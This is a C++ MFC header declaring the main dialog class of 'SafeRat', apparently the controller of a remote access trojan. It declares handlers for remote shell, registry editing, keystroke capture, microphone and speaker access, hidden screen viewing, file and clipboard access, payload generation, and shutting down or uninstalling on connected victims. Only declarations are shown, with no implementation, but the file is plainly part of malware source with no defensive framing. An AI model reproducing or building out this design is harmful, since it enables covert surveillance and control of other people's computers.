#pragma once
#include "SEU_QQwry.h"
#include "IniFile.h"
#include "ColumnTreeCtrl.h"
#include "LogView.h"



class CSafeRatDlg : public CXTPDialog 
{

public:
	CSafeRatDlg(CWnd* pParent = nullptr);	


public:
	BOOL InitView();											
	CString Getloadip(int ipv6);										
	LRESULT OnDockingPaneNotify(WPARAM wParam, LPARAM lParam);  
	void Activate(int nPort);									
	void ShowToolTips(LPCTSTR lpszText);						
	CString GetExePath(void);									
	void SendSelectCommand(PBYTE pData, UINT nSize);			
	void SendBaseDll(BYTE bToken, char* pFileName);  

	void random_string(char* str,int n);						
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode);
	static void ProcessReceiveComplete(ClientContext *pContext);
	void SendIpinfo(char* data,int len);						
	ClientContext* IsSelectAdmin();										

public:

	DWORD					m_Count;
	bool					m_bIsQQwryExist;					
	SEU_QQwry				m_gQQwry;							
	CIniFile				m_IniFile;							
	CColumnTreeCtrl			m_OnlineList;						
	CLogView				m_log;								
	CImageList				tree_ImageLogList;					

public:
	CXTPStatusBar				m_wndStatusBar;					
	CXTPProgressCtrl*			m_ProgressCtrl;					
	CFont						m_fntEdit;						
	CXTPTrayIcon				m_TrayIcon;						
	CXTPDockingPaneManager		m_paneManager;					
	

#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SAFERAT_DIALOG };
#endif
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	

protected:
	HICON m_hIcon;

	
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnTrayShow();
	afx_msg void OnTrayHide();
	afx_msg void OnTrayExit();
	afx_msg void OnClose();
	afx_msg void OnRclickListUser(NMHDR *pNMHDR, LRESULT *pResult);
protected:
	afx_msg LRESULT OnRemovefromlist(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnClosedlg(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnAddtolist(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnUnstall();
	afx_msg void OnAddGroup();
	afx_msg void OnDelGroup();
	afx_msg void OnChangeGroup();
	afx_msg void OnEditRemark();
protected:
	afx_msg LRESULT OnOpenshelldialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnShell();
	afx_msg void OnReg();
protected:
	afx_msg LRESULT OnOpenregeditdialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnSpeaker();
protected:
	afx_msg LRESULT OnOpenspeakdialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenmikedialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnMike();
	afx_msg void OnServer();
protected:
	afx_msg LRESULT OnOpenserverdialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenhostdialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnHost();
	afx_msg void OnKeyboard();
protected:
	afx_msg LRESULT OnOpenkeyboarddialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnShutdown();
	afx_msg void OnReboot();
	afx_msg void OnLogoff();
	afx_msg void OnScreen();
protected:
	afx_msg LRESULT OnOpenscreendialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnFile();
protected:
	afx_msg LRESULT OnOpenfiledialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnGenerate();
	afx_msg void OnConfig();
public:
	afx_msg void OnHideScreen();
protected:
	afx_msg LRESULT OnOpenhidescreendialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnMovOnline();
protected:
	virtual BOOL OnCommand(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void On32916();
protected:
	afx_msg LRESULT OnOpenpluginsdialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void On32918();
protected:
	afx_msg LRESULT OnOpenclipdialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void On32919();
	afx_msg void On32920();
	afx_msg void On32921();
	afx_msg void On32922();
};
